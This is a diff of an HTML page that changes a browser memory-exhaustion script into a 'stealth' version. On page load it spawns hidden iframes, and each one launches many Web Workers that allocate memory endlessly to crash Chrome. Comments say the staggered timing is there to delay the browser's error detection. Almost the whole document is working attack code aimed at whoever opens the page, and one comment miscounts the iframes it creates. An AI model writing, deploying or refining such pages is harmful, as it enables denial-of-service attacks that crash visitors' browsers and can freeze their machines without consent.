@@ -1,32 +1,50 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Final Chrome Crash - Memory Exhaustion</title>
+    <title>Stealth Chrome Crash - Iframe Overload</title>
 </head>
 <body>
-    <h1>Final Chrome Crash - Memory Exhaustion</h1>
-    <p>Open 12+ tabs for best results.</p>
+    <h1>Chrome Crash Test - Iframe Overload</h1>
+    <p>This page will crash Chrome automatically.</p>
 
     <script>
-        function startWorker() {
-            let code = `
-                let data = [];
-                function allocate() {
-                    for (let i = 0; i < 50; i++) { // Allocating in smaller blocks
-                        data.push(new Float64Array(5e6)); // More frequent, fragmented allocations
+        function createIframe() {
+            let iframe = document.createElement("iframe");
+            iframe.style.display = "none"; // Hide iframe
+            iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(`
+                <script>
+                    function startWorker() {
+                        let code = \`
+                            let data = [];
+                            function allocate() {
+                                for (let i = 0; i < 50; i++) { // Allocating in smaller blocks
+                                    data.push(new Float64Array(5e6)); // More frequent, fragmented allocations
+                                }
+                                setTimeout(allocate, 100); // Staggered execution to delay Chrome's error detection
+                            }
+                            allocate();
+                        \`;
+                        let blob = new Blob([code], { type: "application/javascript" });
+                        let worker = new Worker(URL.createObjectURL(blob));
                     }
-                    setTimeout(allocate, 100); // Staggered execution to delay Chrome's error detection
-                }
-                allocate();
-            `;
-            let blob = new Blob([code], { type: "application/javascript" });
-            let worker = new Worker(URL.createObjectURL(blob));
+
+                    let coreMultiplier = navigator.hardwareConcurrency * 8; // Increased CPU threads
+                    for (let i = 0; i < coreMultiplier; i++) {
+                        setTimeout(startWorker, i * 50);
+                    }
+                <\/script>
+            `);
+            document.body.appendChild(iframe);
         }
 
-        let coreMultiplier = navigator.hardwareConcurrency * 8; // Increased to 8x CPU cores
-        for (let i = 0; i < coreMultiplier; i++) {
-            setTimeout(startWorker, i * 50); // More aggressive spawning with slight delay
+        function launchAttack() {
+            for (let i = 0; i < 15; i++) { // Spawn 12 hidden iframes
+                setTimeout(createIframe, i * 100);
+            }
         }
+
+        // Automatically launch attack on page load
+        launchAttack();
     </script>
 </body>
 </html>
